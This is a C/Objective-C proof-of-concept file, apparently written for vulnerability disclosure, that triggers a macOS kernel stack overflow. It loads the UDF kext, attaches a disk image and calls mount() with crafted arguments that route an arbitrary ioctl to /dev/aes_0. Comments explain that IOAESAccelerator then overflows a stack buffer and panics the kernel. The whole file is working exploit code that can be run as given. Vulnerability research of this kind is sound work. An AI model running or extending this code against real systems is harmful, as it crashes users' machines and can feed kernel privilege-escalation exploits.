#import <Foundation/Foundation.h>
#include <sys/mount.h>
#include <sys/ioctl.h>
//clang poc.m -o poc
//./poc

static char *
mktempdir(void)
{
    char *path = malloc(PATH_MAX);
    strcpy(path, "/tmp/poc.XXXXXXXX");
    atexit_b(^{ free(path); });
    mkdtemp(path);
    return path;
}

static int load_udf(void){
    struct vfsconf conf ={};
    int err = getvfsbyname("udf", &conf);
    if(err ==0){
        return 0;
    }
    int pid = fork();
    if(pid==0){
        execl("/sbin/kextload", "/sbin/kextload", "/System/Library/Extensions/udf.kext", 0);
        exit(0);
    }
    else{
        int status = 0;
        wait4(pid, &status, 0, NULL);
    }
    err = getvfsbyname("udf", &conf);
    return err;
}


static char* find_disk(void){
    char* path = malloc(128);
    for(int i=0;i<128;i++){
        sprintf(path, "/dev/disk%d",i);
        if(access(path, 0) == 0 && access(path, R_OK ) ==0){
            return path;
        }
    }
    free(path);
    return 0;
}

static int create_dmg(char* path){
    int pid = fork();
    if(pid==0){
        execl("/usr/bin/hdiutil", "/usr/bin/hdiutil", "create", "-size", "10m", "-fs", "APFS",path, 0);
        exit(0);
    }
    else{
        int status = 0;
        wait4(pid, &status, 0, NULL);
    }
    return 0;
}
static int load_dmg(char* path){
    int pid = fork();
    if(pid==0){
        execl("/usr/bin/hdiutil", "/usr/bin/hdiutil", "attach", "-noautoopen", "-nomount",path, 0);
        exit(0);
    }
    else{
        int status = 0;
        wait4(pid, &status, 0, NULL);
    }
    return 0;
}

static void create_and_load_dmg(void){
    char path[128] = {};
    strcpy(path,"/tmp/poc.dmg");
    unlink(path);
    printf("create %s\n", path);
    create_dmg(path);
    load_dmg(path);
}

static void udf_poc(void){
    int err;
    err = load_udf();
    if(err==0){
        printf("ok, we loaded UDF\n");
    }
    else{
        printf("cannot load udf kernel extension\n");
        return;
    }
    char* disk_path = find_disk();
    if(disk_path==0){
        create_and_load_dmg();
        disk_path = find_disk();
    }
    if(disk_path==0){
        printf("cannot find readable /dev/disk*\n");
        return;
    }
    char* mount_path = mktempdir();
    printf("mount_path = %s\n", mount_path);
   
    char all_mount_args[0x468] = {};
    *(char**)(all_mount_args + 0) = disk_path;
    char* mount_args = all_mount_args+8;
    *(int*)(mount_args + 1076) = 0x40285465;//arbitrary command
    *(int*)(mount_args + 1068) = 0;
    *(int*)(mount_args + 1036) = 2;
    *(int*)(mount_args + 1024) = 1;
    *(int*)(mount_args + 1028) = 1;

    char* vnode_path = "/dev/aes_0"; //vnode_open(vnode_path,...)
    strcpy(mount_args, vnode_path);
    // mount -> udf_mount -> VNOP_IOCTL(vp,command ..
    // /dev/aes_0 will invoke IOAESAccelerator::dev_ioctl to process ioctl commands
    // 0x40285465 means there is an output buffe of length 0x28 bytes
    // IOAESAccelerator::dev_ioctl writes 0x28 bytes into a stack buffer of length 0x18 bytes
    // The poc will trigger a kernel panic caused by a stack overflow
    // the extensive landscape of ioctl functions, coupled with numerous ioctl commands, amplifies the attack surface when unrestricted command is permitted.
    err = mount("udf", mount_path, MNT_RDONLY, all_mount_args);
    printf("no panic?\n");
}

int main() {
    udf_poc();
    return 0;
}
